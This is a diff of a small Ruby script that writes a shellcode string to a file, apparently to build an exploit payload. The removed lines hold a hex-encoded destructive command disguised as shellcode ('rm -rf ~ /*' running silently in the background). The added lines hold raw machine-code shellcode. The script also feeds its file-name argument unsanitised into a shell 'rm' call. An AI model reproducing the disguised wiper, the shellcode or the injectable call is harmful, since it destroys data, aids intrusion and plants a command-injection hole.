@@ -11,9 +11,8 @@ if ARGV.empty?
 else
 
     system("rm -f #{ARGV[0]}")
-    shellcode = "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20" +
-    "\x2F\x2A\x20\x32\x3e\x20\x2f\x64\x65" +
-    "\x76\x2f\x6e\x75\x6c\x6c\x20\x26"
+    shellcode = "\x68\x97\x4C\x80\x7C\xB8" +
+    "\x4D\x11\x86\x7C\xFF\xD0"
 
     puts  "Writing to #{ARGV[0]}"
     File.open("#{ARGV[0]}", 'wb'){|f| f.write(shellcode)}
